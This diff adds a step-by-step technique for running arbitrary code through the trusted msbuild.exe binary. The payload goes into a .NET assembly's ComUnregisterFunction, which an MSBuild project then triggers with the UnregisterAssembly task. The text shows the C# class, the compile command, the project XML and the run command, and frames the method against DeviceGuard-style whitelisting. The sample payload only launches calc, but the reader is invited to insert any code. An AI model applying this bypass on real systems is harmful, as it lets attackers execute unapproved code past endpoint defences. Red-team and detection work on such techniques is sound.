@@ -1,0 +1,46 @@
+What are the limitations?
+
+If you don't want to host the .NET assembly remotely, then you’ll need to drop it to disk.
+This will not work if DeviceGuard is enabled and blocking the loading of unsigned .NET assemblies.
+
+
+1. Create a C# file and place your payload into a [ComUnregisterFunction]. You do that like this:
+
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+[ComVisible(true)]
+public class Sample
+{
+    //Any function name works
+    [ComUnregisterFunction] 
+    public static void Unregister(string str)
+    {
+	//Arbitrary code inserted here
+        Process.Start("calc"); 
+    }
+}
+
+
+2. Compile your code into a .NET assembly.
+
+csc.exe /target:library unregister.cs
+
+
+3. Modify the XML file from MSDN so that the OutputPath value is equal to the folder where your DLL lives and the FileName is the name of your DLL.
+
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <PropertyGroup>
+        <OutputPath>C:\Users\ponce\Desktop</OutputPath>
+        <FileName>\unregister.dll</FileName>
+    </PropertyGroup>
+    <Target Name="UnregisterAssemblies">
+        <UnregisterAssembly
+            Condition="Exists('$(OutputPath)$(FileName)')"
+            Assemblies="$(OutputPath)$(FileName)" />
+    </Target>
+</Project>
+4. Run msbuild.exe and provide it the path to this xml file.
+
+msbuild.exe unregister.xml
